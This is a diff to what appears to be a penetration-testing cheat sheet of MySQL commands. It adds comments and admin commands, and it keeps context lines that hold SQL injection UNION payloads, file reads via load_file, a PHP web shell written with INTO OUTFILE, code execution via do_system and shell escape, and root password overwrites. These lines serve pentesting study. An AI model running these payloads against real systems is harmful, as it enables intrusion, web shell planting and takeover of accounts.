@@ -181,33 +181,39 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
 ## Basic & interesting MySQL commands
 
 ```sql
+# Database and tables commands
 show databases;
+create database <name>;
 use <database>;
 show tables;
 describe <table_name>;
 
-select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
-select user,file_priv from mysql.user where user='root'; #File privileges
-select version(); #version
-select @@version(); #version
-select user(); #User
-select database(); #database name
+# User commands
+select grantee, table_schema, privilege_type FROM schema_privileges; # Exact privileges
+select user,file_priv from mysql.user where user='root'; # File privileges
+GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';
+FLUSH PRIVILEGES;
 
+# Inspect various values
+select version(); # version
+select @@version(); # version
+select user(); # User
+select database(); # database name
 show variables like 'plugin_dir';
 
-#Try to execute code
+# Try to execute code
 select do_system('id');
 \! sh
 
-#Basic MySQLi
+# Basic MySQLi
 Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
 Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
 
-#Read & Write
+# Read & Write
 select load_file('/var/lib/mysql-files/key.txt'); #Read file
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
 
-#Try to change MySQL root password
+# Try to change MySQL root password
 UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
 UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
 FLUSH PRIVILEGES;
